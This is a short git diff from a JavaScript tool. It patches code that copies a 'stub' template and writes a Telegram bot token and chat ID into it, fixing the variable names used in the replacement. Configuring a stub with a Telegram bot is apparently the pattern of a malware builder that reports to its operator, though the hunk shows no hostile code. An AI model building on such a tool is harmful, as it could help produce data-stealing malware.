@@ -98,10 +98,10 @@ async function main() {
  
     const updatedStubCode = stubCode.replace(
       /const botToken = 'YOURBOTTOKEN';/,
-      `const telegramBotToken = '${botToken}';`
+      `const botToken = '${botToken}';`
     ).replace(
       /const chatId = 'YOURCHATID';/,
-      `const telegramChatId = '${chatId}';`
+      `const chatId = '${chatId}';`
     );
     
     if (stubCode === updatedStubCode) {
